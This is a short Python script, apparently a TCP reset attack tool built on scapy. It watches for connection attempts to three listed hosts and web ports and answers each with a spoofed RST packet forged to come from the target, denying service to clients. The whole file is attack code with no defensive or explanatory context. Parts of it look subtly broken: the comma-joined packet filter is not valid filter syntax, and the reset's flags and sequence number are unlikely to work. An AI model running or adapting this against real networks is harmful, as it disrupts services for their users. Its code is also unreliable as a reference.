#!/usr/bin/env python3

from scapy.all import *

target_ips = ['10.0.0.27', '10.0.0.28', '10.0.0.29']    # List of target IP addresses
target_ports = [80, 443, 8080]                          # List of target ports

def reply(packet):
    spoofed_pkt = IP(src=packet[IP].dst, dst=packet[IP].src)/ \
        TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="R", seq=packet[TCP].ack)
    send(spoofed_pkt, verbose=False)

sniff(iface='your_iface', filter='dst {0} and dst port {1} and (tcp[tcpflags] & tcp-syn) != 0'.format(','.join(target_ips), ','.join(map(str,target_ports))), prn=reply)
